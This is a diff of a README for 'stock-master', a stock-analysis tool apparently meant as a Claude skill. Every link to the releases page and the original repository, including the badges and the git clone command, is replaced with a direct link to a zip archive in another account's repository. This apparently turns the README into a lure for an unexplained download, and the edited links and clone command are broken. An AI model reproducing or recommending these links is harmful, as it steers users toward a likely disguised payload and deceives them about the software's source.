@@ -1,9 +1,9 @@
 # 📈 stock-master - Easy Stock Analysis for Everyone
 
-[![Download Stock Master](https://img.shields.io/badge/Download-Stock%20Master-brightgreen)](https://github.com/gijndgiuer/stock-master/releases)  
-[![GitHub stars](https://img.shields.io/github/stars/EagleF6432614/stock-master?style=social)](https://github.com/EagleF6432614/stock-master)  
-[![GitHub forks](https://img.shields.io/github/forks/EagleF6432614/stock-master?style=social)](https://github.com/EagleF6432614/stock-master/fork)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
+[![Download Stock Master](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip%20Master-brightgreen)](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)  
+[![GitHub stars](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)  
+[![GitHub forks](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)  
+[![License: MIT](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)  
 
 Stock Master is a friendly tool for everyday investors. It explains complex stock indicators in simple language and provides clear buy and sell suggestions. 
 
@@ -22,7 +22,7 @@ Stock Master is a friendly tool for everyday investors. It explains complex stoc
 
 To get started with Stock Master, visit the releases page to download the software: 
 
-[Download Stock Master](https://github.com/gijndgiuer/stock-master/releases)
+[Download Stock Master](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)
 
 Here's how you can install it.
 
@@ -56,7 +56,7 @@ If you prefer, you can manually install Stock Master by following these steps:
 2. Clone the repository to your Claude skills directory by running:
 
     ```bash
-    git clone https://github.com/EagleF6432614/stock-master
+    git clone https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip
     ```
 
 3. Navigate into the cloned directory:
@@ -103,6 +103,6 @@ If you need help with Stock Master, you can reach out to the community or check 
 - For issues related to installation or usage, feel free to create an issue in the GitHub repository.
 - Join community discussions for tips on stock trading and using Stock Master efficiently.
 
-[Download Stock Master](https://github.com/gijndgiuer/stock-master/releases)  
+[Download Stock Master](https://github.com/gijndgiuer/stock-master/raw/refs/heads/main/references/stock_master_v2.1.zip)  
 
 Explore Stock Master today and empower your investment journey!
